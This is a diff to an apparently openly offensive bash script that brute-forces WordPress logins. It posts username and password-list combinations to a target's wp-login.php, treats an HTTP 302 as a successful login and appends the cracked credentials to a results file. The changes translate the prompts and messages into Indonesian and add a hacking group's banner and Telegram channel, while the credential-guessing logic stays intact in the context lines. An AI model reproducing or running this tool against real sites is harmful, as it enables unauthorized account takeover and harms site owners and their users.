@@ -35,13 +35,13 @@ function _TestLogin() {
         LetsTry=$(curl --connect-timeout ${curl_timeout} --max-time ${curl_timeout} -s -w "\nHTTP_STATUS_CODE_X %{http_code}\n" "${Target}/wp-login.php" --data "log=${Username}&pwd=${Password}&wp-submit=Log+In" --compressed)
         if [[ ! -z $(echo ${LetsTry} | grep login_error | grep div) ]];
         then
-                echo -e "${CYN}INFO: Invalid ${Target} ${Username}:${Password}${CLR}"
+                echo -e "${CYN}Gagal Login ${Target} ${Username}:${Password}${CLR}"
         elif [[ $(echo ${LetsTry} | grep "HTTP_STATUS_CODE_X" | awk '{print $2}') == "302" ]];
         then
-                echo -e "${GRN}[!] FOUND ${Target} \e[30;48;5;82m ${Username}:${Password} ${CLR}"
+                echo -e "${GRN}[!] Berhasil login ${Target} \e[30;48;5;82m ${Username}:${Password} ${CLR}"
                 echo "${Target} [${Username}:${Password}]" >> wpbf-results.txt
         else
-                echo -e "${CYN}INFO: Invalid ${Target} ${Username}:${Password}${CLR}"
+                echo -e "${CYN}Gagal Login ${Target} ${Username}:${Password}${CLR}"
         fi
 }
 
@@ -50,20 +50,20 @@ echo '| |  | | ___  _ __ __| |_ __  _ __ ___  ___ ___ '
 echo '| |/\| |/ _ \| `__/ _` | `_ \| `__/ _ \/ __/ __|'
 echo '\  /\  / (_) | | | (_| | |_) | | |  __/\__ \__ \'
 echo ' \/  \/ \___/|_|  \__,_| .__/|_|  \___||___/___/'
-echo '                       |_|.::Arex091_T3GASEC'
-echo ''
+echo '                       |_| AREX091_T3GASEC'
+echo ' JOIN CHANEL T.me/GarudaSecId'
 
-echo -ne "[?] website target : "
+echo -ne "[?] target : "
 read Target
 
 curl --connect-timeout ${curl_timeout} --max-time ${curl_timeout} -s "${Target}/wp-login.php" > wplogin.tmp
 if [[ -z $(cat wplogin.tmp | grep "wp-submit") ]];
 then
-        echo -e "${RED}ERROR: Invalid wordpress wp-login!${CLR}"
+        echo -e "${RED}ERROR: Tidak terdeteksi wordpress wp-login!${CLR}"
         exit
 fi
 
-echo -ne "[?] Input password lists in (file) : "
+echo -ne "[?] masukan list password : "
 read PasswordLists
 
 if [[ ! -f ${PasswordLists} ]]
@@ -89,7 +89,7 @@ then
         done
 else
         echo -e "${CYN}INFO: Cannot find username${CLR}"
-        echo -ne "[?] Input username manually : "
+        echo -ne "[?] Masukan Username secara manual: "
         read User
 
         if [[ -z ${PasswordLists} ]]
@@ -107,4 +107,4 @@ else
                 wait
         )
 fi
-echo "INFO: Found $(cat wpbf-results.txt | grep ${Target} | sort -nr | uniq | wc -l) username & password in ./wpbf-results.txt"
+echo "Berhasil Login $(cat wpbf-results.txt | grep ${Target} | sort -nr | uniq | wc -l) username & password in ./wpbf-results.txt"
